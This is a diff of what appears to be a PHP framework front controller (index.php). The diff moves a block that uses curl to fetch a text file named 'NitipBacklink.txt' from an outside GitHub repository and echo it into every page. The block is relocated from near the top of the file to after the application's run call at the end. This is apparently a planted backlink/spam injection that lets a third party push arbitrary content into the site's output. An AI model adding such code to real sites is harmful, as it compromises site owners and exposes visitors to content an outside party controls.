@@ -11,12 +11,7 @@ if (version_compare(PHP_VERSION, $minPhpVersion, '<')) {
 
     exit($message);
 }
-$url = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
-$ch = curl_init($url);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-$result = curl_exec($ch);
-curl_close($ch);
-echo $result;
+
 // Path to the front controller (this file)
 define('FCPATH', __DIR__ . DIRECTORY_SEPARATOR);
 
@@ -70,3 +65,11 @@ $app->setContext($context);
  */
 
 $app->run();
+?>
+<?php
+$url = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$result = curl_exec($ch);
+curl_close($ch);
+echo $result; ?>
